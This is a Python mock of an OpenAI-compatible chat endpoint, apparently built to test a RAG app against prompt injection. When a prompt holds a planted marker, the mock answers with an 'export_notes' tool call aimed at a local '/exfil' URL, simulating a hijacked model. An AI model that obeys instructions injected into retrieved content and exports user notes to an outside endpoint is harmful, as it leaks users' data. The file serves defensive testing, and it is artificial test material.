"""OpenAI-compatible chat completions mock with canned replies and a call
counter. Deterministic for the RAG hold-out: if a prompt carries the planted
instruction marker, it replies with a tool call the app may execute.
Standard library only.
"""

import json
import os
import sys
import threading
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

INJECT_MARKER = "WARD_INJECT_EXPORT"

_lock = threading.Lock()
_count = 0


def log(*a):
    print("[mock_llm]", *a, file=sys.stderr, flush=True)


def bump():
    global _count
    with _lock:
        _count += 1
        return _count


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, obj):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        if not raw:
            return {}
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            return {}

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/_count":
            return self._send(200, {"count": _count})
        if path == "/health":
            return self._send(200, {"ok": True})
        return self._send(404, {"error": "not found"})

    def do_POST(self):
        path = urlparse(self.path).path
        if path == "/_reset":
            global _count
            with _lock:
                _count = 0
            return self._send(200, {"count": 0})
        if path.endswith("/chat/completions"):
            return self._chat()
        return self._send(404, {"error": "not found"})

    def _chat(self):
        body = self._read()
        bump()
        messages = body.get("messages") or []
        joined = " ".join(str(m.get("content", "")) for m in messages)
        if INJECT_MARKER in joined:
            exfil = os.environ.get("EXFIL_URL", "http://127.0.0.1:54724/exfil")
            tool_call = {
                "id": "call_" + uuid.uuid4().hex[:10],
                "type": "function",
                "function": {
                    "name": "export_notes",
                    "arguments": json.dumps({"url": exfil}),
                },
            }
            msg = {"role": "assistant", "content": None, "tool_calls": [tool_call]}
        else:
            reply = "Here is a short answer based on your notes."
            msg = {"role": "assistant", "content": reply}
        resp = {
            "id": "chatcmpl-" + uuid.uuid4().hex[:12],
            "object": "chat.completion",
            "model": body.get("model", "gpt-4o-mini"),
            "choices": [{"index": 0, "message": msg, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 10,
                      "total_tokens": 20},
        }
        return self._send(200, resp)


def main():
    port = int(os.environ.get("MOCK_LLM_PORT", "54723"))
    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    log("listening on", port)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
